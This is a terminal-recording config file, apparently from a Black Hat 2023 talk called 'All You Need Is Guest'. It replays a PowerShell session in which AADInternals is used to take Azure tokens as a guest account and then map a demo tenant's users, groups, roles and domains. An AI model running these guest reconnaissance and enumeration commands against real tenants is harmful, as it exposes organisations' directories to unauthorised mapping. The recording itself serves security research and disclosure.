@@ -1,0 +1,530 @@
+# The configurations that used for the recording, feel free to edit them
+config:
+
+  # Specify a command to be executed
+  # like `/bin/bash -l`, `ls`, or any other commands
+  # the default is bash for Linux
+  # or powershell.exe for Windows
+  command: powershell.exe
+  
+  # Specify the current working directory path
+  # the default is the current working directory path
+  cwd: Z:\bhusa2023\all-you-need-is-guest
+  
+  # Export additional ENV variables
+  env:
+    recording: true
+  
+  # Explicitly set the number of columns
+  # or use `auto` to take the current
+  # number of columns of your shell
+  cols: 90
+  
+  # Explicitly set the number of rows
+  # or use `auto` to take the current
+  # number of rows of your shell
+  rows: 30
+  
+  # Amount of times to repeat GIF
+  # If value is -1, play once
+  # If value is 0, loop indefinitely
+  # If value is a positive number, loop n times
+  repeat: 0
+  
+  # Quality
+  # 1 - 100
+  quality: 100
+  
+  # Delay between frames in ms
+  # If the value is `auto` use the actual recording delays
+  frameDelay: auto
+  
+  # Maximum delay between frames in ms
+  # Ignored if the `frameDelay` isn't set to `auto`
+  # Set to `auto` to prevent limiting the max idle time
+  maxIdleTime: 1500
+  
+  # The surrounding frame box
+  # The `type` can be null, window, floating, or solid`
+  # To hide the title use the value null
+  # Don't forget to add a backgroundColor style with a null as type
+  frameBox:
+    type: floating
+    title: All You Need Is Guest (@mbrg0)
+    style:
+      border: 0px black solid
+      # boxShadow: none
+      # margin: 0px
+  
+  # Add a watermark image to the rendered gif
+  # You need to specify an absolute path for
+  # the image on your machine or a URL, and you can also
+  # add your own CSS styles
+  watermark:
+    imagePath: null
+    style:
+      position: absolute
+      right: 15px
+      bottom: 15px
+      width: 100px
+      opacity: 0.9
+  
+  # Cursor style can be one of
+  # `block`, `underline`, or `bar`
+  cursorStyle: block
+  
+  # Font family
+  # You can use any font that is installed on your machine
+  # in CSS-like syntax
+  fontFamily: "Monaco, Lucida Console, Ubuntu Mono, Monospace"
+  
+  # The size of the font
+  fontSize: 28
+  
+  # The height of lines
+  lineHeight: 1
+  
+  # The spacing between letters
+  letterSpacing: 0
+  
+  # Theme
+  theme:
+    background: "transparent"
+    foreground: "#afafaf"
+    cursor: "#c7c7c7"
+    black: "#232628"
+    red: "#fc4384"
+    green: "#b3e33b"
+    yellow: "#ffa727"
+    blue: "#75dff2"
+    magenta: "#ae89fe"
+    cyan: "#708387"
+    white: "#d5d5d0"
+    brightBlack: "#626566"
+    brightRed: "#ff7fac"
+    brightGreen: "#c8ed71"
+    brightYellow: "#ebdf86"
+    brightBlue: "#75dff2"
+    brightMagenta: "#ae89fe"
+    brightCyan: "#b1c6ca"
+    brightWhite: "#f9f9f4"
+  
+# Records, feel free to edit them
+records:
+  - delay: 465
+    content: "\e[?25l\e[2J\e[m\e[HWindows PowerShell\r\nCopyright (C) Microsoft Corporation. All rights reserved.\e[4;1HInstall the latest PowerShell for new features and improvements! https://aka.ms/PSWindows\e[6;1H\e]0;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\a\e[?25h"
+  - delay: 92
+    content: 'PS Z:\bhusa2023\all-you-need-is-guest> '
+  - delay: 27048
+    content: "\e[93mImport-Module \e[mAADInternals"
+  - delay: 1779
+    content: "\r\n"
+  - delay: 22566
+    content: "\e[38;5;11m    ___    ___    ____  ____      __                        __    \r\n   /   |  /   |  / __ \\/  _/___  / /____  _________  ____ _/ /____\r\n  / /| | / /| | / / / // // __ \\/ __/ _ \\/ ___/ __ \\/ __ `/ / ___/\r\n / ___ |/ ___ |/ /_/ _/ // / / / /_/  __/ /  / / / / /_/ / (__  ) \r\n/_/  |_/_/  |_/_____/___/_/ /_/\\__/\\___/_/  /_/ /_/\\__,_/_/____/  \r\n  \r\n v0.9.0 \U0001F6E1️ TROOPERS23 edition by @DrAzureAD (Nestori Syynimaa)\r\n\e]0;AADInternals 0.9.0\a\e[m"
+  - delay: 39
+    content: 'PS Z:\bhusa2023\all-you-need-is-guest> '
+  - delay: 8300
+    content: "\e[93mGet-AADIntAccessTokenForAzureCoreManagement \e[90m-SaveToCache"
+  - delay: 17
+    content: "\e[m"
+  - delay: 2342
+    content: "\r\n"
+  - delay: 550
+    content: "\e[?25l\e[38;5;11m\e[48;5;6m\e[3;1H                                                                                                                        \e[K Reading web response                                                                                                   \e[K    Reading response stream... (Number of bytes read: 14749)                                                            \e[K                                                                                                                        \e[K\e[15;1H\e[?25h"
+  - delay: 17
+    content: "\e[m"
+  - delay: 46
+    content: "\e[?25l\e[3;1H                                                                                                                        \e[KInstall the latest PowerShell for new features and improvements! https://aka.ms/PSWindows                               \e[K                                                                                                                        \e[KPS Z:\\bhusa2023\\all-you-need-is-guest> \e[38;5;11mImport-Module \e[mAADInternals                                                     \e[K\e[15;1H\e[?25h"
+  - delay: 31
+    content: "Logging in to Microsoft Services\r\nEnter email, phone, or Skype: "
+  - delay: 3940
+    content: hi@pwntoso.onmicrosoft.com
+  - delay: 1226
+    content: "\r\n"
+  - delay: 692
+    content: 'Password: '
+  - delay: 2645
+    content: '****************************************'
+  - delay: 769
+    content: "\r\n"
+  - delay: 492
+    content: "\e[?25l\e[38;5;11m\e[48;5;6m\e[3;1H                                                                                                                        \e[K Reading web response                                                                                                   \e[K    Reading response stream... (Number of bytes read: 165)                                                              \e[K                                                                                                                        \e[K\e[18;1H\e[?25h"
+  - delay: 17
+    content: "\e[?25l\e[m\e[3;1H                                                                                                                        \e[KInstall the latest PowerShell for new features and improvements! https://aka.ms/PSWindows                               \e[K                                                                                                                        \e[KPS Z:\\bhusa2023\\all-you-need-is-guest> \e[38;5;11mImport-Module \e[mAADInternals                                                     \e[K\e[18;1H\e[?25h"
+  - delay: 1383
+    content: "\e[?25lAccessToken saved to cache.\e[20;1HTenant                               User                       Resource                             Client\e[12X\r\n------                               ----                       --------                             ------\e[12X\r\n420983fd-32b0-4abd-89e0-c3ef3236fc73 hi@pwntoso.onmicrosoft.com https://management.core.windows.net/ d3590ed6-52b3-4...\e[25;1HPS Z:\\bhusa2023\\all-you-need-is-guest> \e[?25h"
+  - delay: 6710
+    content: "\e[93mGet-AADIntAzureTenants"
+  - delay: 16
+    content: "\e[m"
+  - delay: 912
+    content: "\r\n"
+  - delay: 590
+    content: "\r\nId                                   Country Name        Domains\e[21X\r\n--                                   ------- ----        -------\e[21X\r\n420983fd-32b0-4abd-89e0-c3ef3236fc73 US      Pwntoso     {pwntoso.onmicrosoft.com}   \r\nfc993b0f-345b-4d01-9f67-9ac4a140dd43 IL      Zenity Demo {zenitydemo.onmicrosoft.com}\r\n\n"
+  - delay: 7
+    content: "\nPS Z:\\bhusa2023\\all-you-need-is-guest>\e[1C"
+  - delay: 11722
+    content: "\e[93mGet-AADIntAccessTokenForAzureCoreManagement \e[90m-Tenant \e[mfc993b0f-345b-4d01-9f67-9ac\e[?25l\r\n\e[93m\e[29;42HGet-AADIntAccessTokenForAzureCoreManagement \e[90m-Tenant \e[mfc993b0f-345b-4d01-9f67-9ac4a140dd43 \e[90m-Sa\e[K\e[107C"
+  - delay: 14
+    content: "\e[m\e[93m\e[29;42HGet-AADIntAccessTokenForAzureCoreManagement \e[90m-Tenant \e[mfc993b0f-345b-4d01-9f67-9ac4a140dd43 \e[90m-SaveToCache\e[?25h"
+  - delay: 15
+    content: "\e[m"
+  - delay: 1225
+    content: "\r\n"
+  - delay: 172
+    content: "\e[?25l\e[38;5;11m\e[48;5;6m\e[3;1H                                                                                                                        \e[K Reading web response                                                                                                   \e[K    Reading response stream... (Number of bytes read: 14752)                                                            \e[K                                                                                                                        \e[K\e[30;1H\e[?25h"
+  - delay: 17
+    content: "\e[?25l\e[m\e[38;5;11m\e[3;1H   /   |  /   |  / __ \\/  _/___  / /____  _________  ____ _/ /____                                                      \e[K  / /| | / /| | / / / // // __ \\/ __/ _ \\/ ___/ __ \\/ __ `/ / ___/                                                      \e[K / ___ |/ ___ |/ /_/ _/ // / / / /_/  __/ /  / / / / /_/ / (__  )                                                       \e[K/_/  |_/_/  |_/_____/___/_/ /_/\\__/\\___/_/  /_/ /_/\\__,_/_/____/                                                        \e[K\e[30;1H\e[?25h\e[mLogging in to Zenity Demo"
+  - delay: 15
+    content: "\r\nEnter email, phone, or Skype:\e[1C"
+  - delay: 5220
+    content: hi@pwntoso.onmicrosoft.com
+  - delay: 724
+    content: "\r"
+  - delay: 15
+    content: |+
+
+  - delay: 613
+    content: 'Password: '
+  - delay: 1954
+    content: '****************************************'
+  - delay: 715
+    content: "\r"
+  - delay: 24
+    content: |+
+
+  - delay: 895
+    content: "\e[?25l\e[38;5;11m\e[3;1H/_/  |_/_/  |_/_____/___/_/ /_/\\__/\\___/_/  /_/ /_/\\__,_/_/____/                                                        \e[K                                                                                                                        \e[K v0.9.0 �️ TROOPERS23 edition by @DrAzureAD (Nestori Syynimaa)                                                          \e[K\e[mPS Z:\\bhusa2023\\all-you-need-is-guest> \e[38;5;11mGet-AADIntAccessTokenForAzureCoreManagement \e[38;5;8m-SaveToCache                       \e[K\e[30;1H\e[?25h"
+  - delay: 22
+    content: "\e[m"
+  - delay: 1909
+    content: "AccessToken saved to cache.\r\n\nTenant                               User                       Resource                             Client\r\n------                               ----                       --------                             ------\r\nfc993b0f-345b-4d01-9f67-9ac4a140dd43 hi@pwntoso.onmicrosoft.com https://management.core.windows.net/ d3590ed6-52b3-4... \e[30;1H\n\n"
+  - delay: 10
+    content: "\nPS Z:\\bhusa2023\\all-you-need-is-guest>\e[1C"
+  - delay: 9853
+    content: "\e[92m$results \e[90m= \e[93mInvoke-AADIntReconAsGuest"
+  - delay: 16
+    content: "\e[m"
+  - delay: 1117
+    content: "\r\n"
+  - delay: 341
+    content: "\n\e[38;5;15mChoose the tenant\r\e[m\nChoose the tenant to recon\r"
+  - delay: 21
+    content: "\n\e[38;5;11m[0] 0 Pwntoso  \e[38;5;15m[1] 1 Zenity Demo  \e[m[?] Help (default is \"0\"):\e[K\e[1C"
+  - delay: 1436
+    content: '1'
+  - delay: 240
+    content: "\r"
+  - delay: 12
+    content: |+
+
+  - delay: 13657
+    content: "Tenant brand:\e[16X\e[16C\r\nTenant name:                 zenitydemo.onmicrosoft.com\r\nTenant id:                   fc993b0f-345b-4d01-9f67-9ac4a140dd43\r\nAzure AD objects:            552/50000\r\nDomains:                      ( verified)\r\nNon-admin users restricted?\e[2C\r\nUsers can register apps?\e[5C\r\nDirectory access restricted?\e[1C\r\nGuest access:                unknown\r\nCA policies:                 0\r\nAccess package admins:       0\r\nPS Z:\\bhusa2023\\all-you-need-is-guest>\e[1C\r\nPS Z:\\bhusa2023\\all-you-need-is-guest> \e[97m1\e[m\r\n1\r"
+  - delay: 11
+    content: "\nPS Z:\\bhusa2023\\all-you-need-is-guest>\e[1C"
+  - delay: 9034
+    content: "\e[97m1"
+  - delay: 16
+    content: "\e[m"
+  - delay: 548
+    content: "\e[92m\b$results \e[90m= \e[93mInvoke-AADIntReconAsGuest"
+  - delay: 15
+    content: "\e[m"
+  - delay: 503
+    content: "\e[?25l\e[97m\e[30;42H1\e[35X\e[?25h"
+  - delay: 16
+    content: "\e[m"
+  - delay: 204
+    content: "\b \b"
+  - delay: 3650
+    content: "\e[93m$\e[m\e[92m\b$results\e[m.\e[97mdomains \e[m| \e[93mSelect-Object \e[mid\e[90m,\e[mauthen*\e[90m,\e[misverified\e[90m,\e[msupported*\e[90m,\e[mpassword* | \e[93mF\e[?25l"
+  - delay: 15
+    content: "\e[m\r\n\e[92m\e[29;42H$results\e[m.\e[97mdomains \e[m| \e[93mSelect-Object \e[mid\e[90m,\e[mauthen*\e[90m,\e[misverified\e[90m,\e[msupported*\e[90m,\e[mpassword* | \e[93mFormat-Table\e[?25h"
+  - delay: 16
+    content: "\e[m"
+  - delay: 782
+    content: "\r\n\nid                         authenticationType isVerified supportedServices                   passwordValidityPeriodInDa \e[30;1H\n                                                                                                                     ys \e[30;1H\n--                         ------------------ ---------- -----------------                   -------------------------- \e[30;1H\nzenitydemo.onmicrosoft.com Managed                  True {Email, OfficeCommunicationsOnline}                 2147483647\e[30;1H\n\n"
+  - delay: 16
+    content: "\nPS Z:\\bhusa2023\\all-you-need-is-guest>\e[1C"
+  - delay: 5108
+    content: "\e[92m$results\e[m.\e[97mallowedActions"
+  - delay: 15
+    content: "\e[m"
+  - delay: 676
+    content: "\r\nPS Z:\\bhusa2023\\all-you-need-is-guest>\e[1C"
+  - delay: 6268
+    content: "\e[92m$results \e[90m= \e[93mInvoke-AADIntUserEnumerationAsGuest \e[90m-GroupMembers -Manager -Subordin\e[?25l"
+  - delay: 16
+    content: "\e[m\r\n\e[92m\e[29;42H$results \e[90m= \e[93mInvoke-AADIntUserEnumerationAsGuest \e[90m-GroupMembers -Manager -Subordinates -Roles\e[?25h"
+  - delay: 16
+    content: "\e[m"
+  - delay: 1208
+    content: "\r\n"
+  - delay: 283
+    content: "\n\e[38;5;15mChoose the tenant\r\e[m\nChoose the tenant to recon\r"
+  - delay: 14
+    content: "\n\e[38;5;11m[0] 0 Pwntoso  \e[38;5;15m[1] 1 Zenity Demo  \e[m[?] Help (default is \"0\"):\e[K\e[1C"
+  - delay: 1194
+    content: '1'
+  - delay: 55
+    content: "\r"
+  - delay: 24
+    content: |+
+
+  - delay: 10181
+    content: "Tenant brand: Zenity Demo\r\nTenant name:  zenitydemo.onmicrosoft.com\r\nTenant id:    fc993b0f-345b-4d01-9f67-9ac4a140dd43"
+  - delay: 5
+    content: "\r\nLogged in as: hi@pwntoso.onmicrosoft.com\r\nUsers:        3\r\nGroups:       1\r\nRoles:        1\r\n"
+  - delay: 15
+    content: 'PS Z:\bhusa2023\all-you-need-is-guest> '
+  - delay: 26596
+    content: "\e[?25l\e[91m\e[30;40H> \e[92m$results\e[m.\e[?25h"
+  - delay: 1194
+    content: "\e[?25l\e[30;40H> \e[92m$results\e[m.\e[97mU\e[?25h"
+  - delay: 15
+    content: "\e[m"
+  - delay: 110
+    content: "\e[?25l\e[92m\e[30;42H$results\e[m.\e[97mUs\e[?25h"
+  - delay: 16
+    content: "\e[m"
+  - delay: 63
+    content: "\e[?25l\e[92m\e[30;42H$results\e[m.\e[97mUse\e[?25h"
+  - delay: 15
+    content: "\e[m"
+  - delay: 63
+    content: "\e[?25l\e[92m\e[30;42H$results\e[m.\e[97mUser\e[?25h"
+  - delay: 16
+    content: "\e[m"
+  - delay: 78
+    content: "\e[?25l\e[92m\e[30;42H$results\e[m.\e[97mUsers\e[?25h"
+  - delay: 16
+    content: "\e[m"
+  - delay: 308
+    content: "\r\n\n\n@odata.type                     : #microsoft.graph.user\r\nbusinessPhones                  : {}\r\ndisplayName                     : Hi\r\ngivenName                       :\r\nid                              : 52ba0449-543d-4b85-8612-cd1c5478378e\r\njobTitle                        :\r\nmail                            : hi@pwntoso.onmicrosoft.com\r\nmobilePhone                     :\r\nofficeLocation                  :\r\npreferredLanguage               :\r\nsurname                         :\r\nuserPrincipalName               : hi_pwntoso.onmicrosoft.com#EXT#@zenitydemo.onmicrosoft.com\r\nonPremisesDistinguishedName     :\r\nonPremisesImmutableId           :\r\nonPremisesLastSyncDateTime      :\r\nonPremisesSamAccountName        :\r\nonPremisesSecurityIdentifier    :\r\nrefreshTokensValidFromDateTime  : 2023-07-11T09:36:13Z\r\nsignInSessionsValidFromDateTime : 2023-07-11T09:36:13Z\r\nusageLocation                   :\r\nproxyAddresses                  : {SMTP:hi@pwntoso.onmicrosoft.com}\r\nonPremisesExtensionAttributes   : @{extensionAttribute1=; extensionAttribute2=; extensionAttribute3=;\r\n                                  extensionAttribute4=; extensionAttribute5=; extensionAttribute6=;\r\n                                  extensionAttribute7=; extensionAttribute8=; extensionAttribute9=;\r\n                                  extensionAttribute10=; extensionAttribute11=; extensionAttribute12=;\r\n                                  extensionAttribute13=; extensionAttribute14=; extensionAttribute15=}\r\nprovisionedPlans                : {}\r\n\n@odata.type                     : #microsoft.graph.user\r\nbusinessPhones                  : {}\r\ndisplayName                     : Greg Winston\r\ngivenName                       :\r\nid                              : 2ae9a7ea-fcd6-4672-9b38-4dfe550dc4c9\r\njobTitle                        :\r\nmail                            : gregw@zenitydemo.onmicrosoft.com\r\nmobilePhone                     :\r\nofficeLocation                  :\r\npreferredLanguage               :\r\nsurname                         :\r\nuserPrincipalName               : gregw@zenitydemo.onmicrosoft.com\r\nonPremisesDistinguishedName     :\r\nonPremisesImmutableId           :\r\nonPremisesLastSyncDateTime      :\r\nonPremisesSamAccountName        :\r\nonPremisesSecurityIdentifier    :\r\nrefreshTokensValidFromDateTime  :\r\nsignInSessionsValidFromDateTime :\r\nusageLocation                   :\r\nproxyAddresses                  : {}\r\nonPremisesExtensionAttributes   : @{extensionAttribute1=; extensionAttribute2=; extensionAttribute3=;\r\n                                  extensionAttribute4=; extensionAttribute5=; extensionAttribute6=;\r\n                                  extensionAttribute7=; extensionAttribute8=; extensionAttribute9=;\r\n                                  extensionAttribute10=; extensionAttribute11=; extensionAttribute12=;\r\n                                  extensionAttribute13=; extensionAttribute14=; extensionAttribute15=}\r\nprovisionedPlans                : {}\r\n\n@odata.type                     : #microsoft.graph.user\r\nbusinessPhones                  : {}\r\ndisplayName                     : Hacker\r\ngivenName                       :\r\nid                              : f061e8d5-e356-4674-a2bf-33adf6271bb3\r\njobTitle                        :\r\nmail                            : hacker@pwntoso.onmicrosoft.com\r\nmobilePhone                     :\r\nofficeLocation                  :\r\npreferredLanguage               :\r\nsurname                         :\r\nuserPrincipalName               : hacker_pwntoso.onmicrosoft.com#EXT#@zenitydemo.onmicrosoft.com\r\nonPremisesDistinguishedName     :\r\nonPremisesImmutableId           :\r\nonPremisesLastSyncDateTime      :\r\nonPremisesSamAccountName        :\r\nonPremisesSecurityIdentifier    : \r\nrefreshTokensValidFromDateTime  :\r\nsignInSessionsValidFromDateTime :\r\nusageLocation                   :\r\nproxyAddresses                  : {}\r\nonPremisesExtensionAttributes   : @{extensionAttribute1=; extensionAttribute2=; extensionAttribute3=;\r\n                                  extensionAttribute4=; extensionAttribute5=; extensionAttribute6=;\r\n                                  extensionAttribute7=; extensionAttribute8=; extensionAttribute9=;\r\n                                  extensionAttribute10=; extensionAttribute11=; extensionAttribute12=;\r\n                                  extensionAttribute13=; extensionAttribute14=; extensionAttribute15=}\r\nprovisionedPlans                : {}\r\n\n\n"
+  - delay: 9
+    content: "\nPS Z:\\bhusa2023\\all-you-need-is-guest>\e[1C"
+  - delay: 13771
+    content: "\e[92m$results\e[m.\e[97mUsers"
+  - delay: 16
+    content: "\e[m"
+  - delay: 545
+    content: "\e[?25l\e[92m\e[30;42H$results \e[90m= \e[93mInvoke-AADIntUserEnumerationAsGuest \e[90m-GroupMembers -Manager -Subordin"
+  - delay: 21
+    content: "\e[m\r\n\e[90m\e[29;120Hnates -Roles\e[?25h"
+  - delay: 14
+    content: "\e[m"
+  - delay: 3201
+    content: "\b"
+  - delay: 491
+    content: "\b"
+  - delay: 47
+    content: "\b"
+  - delay: 32
+    content: "\b"
+  - delay: 31
+    content: "\b"
+  - delay: 32
+    content: "\b"
+  - delay: 32
+    content: "\b"
+  - delay: 30
+    content: "\b"
+  - delay: 32
+    content: "\b"
+  - delay: 31
+    content: "\b"
+  - delay: 32
+    content: "\r"
+  - delay: 31
+    content: "\e[?25l\e[29;120H\e[?25h"
+  - delay: 47
+    content: "\b"
+  - delay: 32
+    content: "\b"
+  - delay: 31
+    content: "\b"
+  - delay: 31
+    content: "\b"
+  - delay: 32
+    content: "\b"
+  - delay: 31
+    content: "\b"
+  - delay: 32
+    content: "\b"
+  - delay: 30
+    content: "\b"
+  - delay: 32
+    content: "\b"
+  - delay: 31
+    content: "\b"
+  - delay: 31
+    content: "\b"
+  - delay: 48
+    content: "\b"
+  - delay: 31
+    content: "\b"
+  - delay: 32
+    content: "\b"
+  - delay: 31
+    content: "\b"
+  - delay: 31
+    content: "\b"
+  - delay: 31
+    content: "\b"
+  - delay: 32
+    content: "\b"
+  - delay: 31
+    content: "\b"
+  - delay: 31
+    content: "\b"
+  - delay: 32
+    content: "\b"
+  - delay: 32
+    content: "\b"
+  - delay: 31
+    content: "\b"
+  - delay: 47
+    content: "\b"
+  - delay: 31
+    content: "\b"
+  - delay: 32
+    content: "\b"
+  - delay: 31
+    content: "\b"
+  - delay: 32
+    content: "\b"
+  - delay: 31
+    content: "\b"
+  - delay: 32
+    content: "\b"
+  - delay: 31
+    content: "\b"
+  - delay: 31
+    content: "\b"
+  - delay: 378
+    content: "\e[1C"
+  - delay: 800
+    content: "\e[?25l\e[92m\e[29;42H$results \e[90m= \e[93mInvoke-AADIntUserEnumerationAsGuest \e[90m--GroupMembers -Manager -Subordinates -Roles\e[29;90H\e[?25h"
+  - delay: 16
+    content: "\e[m"
+  - delay: 423
+    content: "\e[?25l\e[92m\e[29;42H$results \e[90m= \e[93mInvoke-AADIntUserEnumerationAsGuest \e[90m-U-GroupMembers -Manager -Subordinates -Roles\e[29;91H\e[?25h"
+  - delay: 16
+    content: "\e[m"
+  - delay: 125
+    content: "\e[?25l\e[92m\e[29;42H$results \e[90m= \e[93mInvoke-AADIntUserEnumerationAsGuest \e[90m-Us-GroupMembers -Manager -Subordinates -Roles\e[29;92H\e[?25h"
+  - delay: 17
+    content: "\e[m"
+  - delay: 31
+    content: "\e[?25l\e[92m\e[29;42H$results \e[90m= \e[93mInvoke-AADIntUserEnumerationAsGuest \e[90m-Use-GroupMembers -Manager -Subordinates -Roles\e[29;93H\e[?25h"
+  - delay: 16
+    content: "\e[m"
+  - delay: 45
+    content: "\e[?25l\e[92m\e[29;42H$results \e[90m= \e[93mInvoke-AADIntUserEnumerationAsGuest \e[90m-User-GroupMembers -Manager -Subordinates -Roles\e[29;94H\e[?25h"
+  - delay: 16
+    content: "\e[m"
+  - delay: 166
+    content: "\e[?25l\e[92m\e[29;42H$results \e[90m= \e[93mInvoke-AADIntUserEnumerationAsGuest \e[90m-UserN-GroupMembers -Manager -Subordinates -Roles\e[29;95H\e[?25h"
+  - delay: 16
+    content: "\e[m"
+  - delay: 125
+    content: "\e[?25l\e[92m\e[29;42H$results \e[90m= \e[93mInvoke-AADIntUserEnumerationAsGuest \e[90m-UserNa-GroupMembers -Manager -Subordinates -Roles\e[29;96H\e[?25h"
+  - delay: 16
+    content: "\e[m"
+  - delay: 94
+    content: "\e[?25l\e[92m\e[29;42H$results \e[90m= \e[93mInvoke-AADIntUserEnumerationAsGuest \e[90m-UserNam-GroupMembers -Manager -Subordinates -Roles\e[29;97H\e[?25h"
+  - delay: 16
+    content: "\e[m"
+  - delay: 78
+    content: "\e[?25l\e[92m\e[29;42H$results \e[90m= \e[93mInvoke-AADIntUserEnumerationAsGuest \e[90m-UserName-GroupMembers -Manager -Subordinates -Roles\e[29;98H\e[?25h"
+  - delay: 16
+    content: "\e[m"
+  - delay: 94
+    content: "\e[?25l\e[92m\e[29;42H$results \e[90m= \e[93mInvoke-AADIntUserEnumerationAsGuest \e[90m-UserName -GroupMembers -Manager\e[m \e[90m-Subordinates -Roles\e[29;99H\e[?25h"
+  - delay: 15
+    content: "\e[m"
+  - delay: 381
+    content: "\e[?25l\e[92m\e[29;42H$results \e[90m= \e[93mInvoke-AADIntUserEnumerationAsGuest \e[90m-UserName \e[mgregw@zenitydemo.onmicrosoft.com-GroupMembers \e[90m-Manager -Subordinates -Roles\e[30;11H\e[?25h"
+  - delay: 17
+    content: "\e[m"
+  - delay: 816
+    content: "\e[?25l\e[92m\e[29;42H$results \e[90m= \e[93mInvoke-AADIntUserEnumerationAsGuest \e[90m-UserName \e[mgregw@zenitydemo.onmicrosoft.com \e[90m-GroupMembers -Manager -Subordinates -Roles\e[30;12H\e[?25h"
+  - delay: 17
+    content: "\e[m"
+  - delay: 606
+    content: "\e[43C"
+  - delay: 21
+    content: "\r\n"
+  - delay: 429
+    content: "\n\e[38;5;15mChoose the tenant\r\e[m\nChoose the tenant to recon\r"
+  - delay: 11
+    content: "\n\e[38;5;11m[0] 0 Pwntoso  \e[38;5;15m[1] 1 Zenity Demo  \e[m[?] Help (default is \"0\"):\e[K\e[1C"
+  - delay: 1350
+    content: '1'
+  - delay: 127
+    content: "\r"
+  - delay: 13
+    content: |+
+
+  - delay: 15499
+    content: "Tenant brand: Zenity Demo\r\nTenant name:  zenitydemo.onmicrosoft.com\r\nTenant id:    fc993b0f-345b-4d01-9f67-9ac4a140dd43\r\nLogged in as: hi@pwntoso.onmicrosoft.com\r\nUsers:        21\r\nGroups:       3\r\nRoles:        1"
+  - delay: 6
+    content: "\r\nPS Z:\\bhusa2023\\all-you-need-is-guest>\e[1C"
+  - delay: 7749
+    content: "\e[92m$results\e[m.\e[97mGroups \e[m| \e[93mSelect-Object \e[mdisplayName\e[90m,\e[mid\e[90m,\e[mmembershiprule\e[90m,\e[mdescription"
+  - delay: 846
+    content: "\r\n\ndisplayName       id                                   membershipRule description\r\n-----------       --                                   -------------- -----------\r\nAll Company       c995ad35-5762-432a-b410-78578427e704                This is the default group for everyone in the ...\e[30;1H\nVendor onboarding 0ce608ea-59e1-41e7-aeb8-8982246c62d7                Vendor onboarding\r\nAll Employees     a3f0b054-8ab9-45c9-bb9c-032056ead136\r\n\n"
+  - delay: 14
+    content: "\nPS Z:\\bhusa2023\\all-you-need-is-guest>\e[1C"
+  - delay: 3446
+    content: "\e[93m^D"
+  - delay: 16
+    content: "\e[m"
+  - delay: 424
+    content: "\e[?25l\e[93m\e[30;42H^D\e[91m^C\r\e[?25h"
+  - delay: 10
+    content: "\e[m\nPS Z:\\bhusa2023\\all-you-need-is-guest>\e[1C"
+  - delay: 879
+    content: "\e[93m^D"
+  - delay: 17
+    content: "\e[m"
+  - delay: 204
+    content: "\e[?25l\e[93m\e[30;42H^D\e[91m^C\r\e[?25h"
+  - delay: 16
+    content: "\e[m\nPS Z:\\bhusa2023\\all-you-need-is-guest>\e[1C"
+  - delay: 612
+    content: "\e[93m^D"
+  - delay: 16
+    content: "\e[m"
+  - delay: 194
+    content: "\e[?25l\e[93m\e[30;42H^D\e[91m^C\r\e[?25h"
+  - delay: 10
+    content: "\e[m\nPS Z:\\bhusa2023\\all-you-need-is-guest>\e[1C"
+  - delay: 3614
+    content: "\e[93m^D"
+  - delay: 16
+    content: "\e[m"
+  - delay: 2083
+    content: "\r\n"
+  - delay: 189
+    content: "\e[38;5;9m♦ : The term '♦' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the \e[m\r\n\e[38;5;9mspelling of the name, or if a path was included, verify that the path is correct and try again.\e[m\r\n\e[38;5;9mAt line:1 char:1\e[m\r\n\e[38;5;9m+ ♦\e[m\r\n\e[38;5;9m+ ~\e[m\r\n\e[38;5;9m    + CategoryInfo          : ObjectNotFound: (♦:String) [], CommandNotFoundException\e[m\r\n\e[38;5;9m    + FullyQualifiedErrorId : CommandNotFoundException\e[m\r\n\e[38;5;9m\e[1C"
+  - delay: 24
+    content: "\e[m\r\nPS Z:\\bhusa2023\\all-you-need-is-guest>\e[1C"
+  - delay: 77756
+    content: "\e[93me"
+  - delay: 15
+    content: "\e[m"
+  - delay: 203
+    content: "\e[93m\bex"
+  - delay: 16
+    content: "\e[m"
+  - delay: 94
+    content: "\e[?25l\e[93m\e[30;42Hexi\e[?25h"
+  - delay: 16
+    content: "\e[m"
+  - delay: 142
+    content: "\e[?25l\e[92m\e[30;42Hexit\e[?25h"
+  - delay: 16
+    content: "\e[m"
+  - delay: 78
+    content: "\r\n"
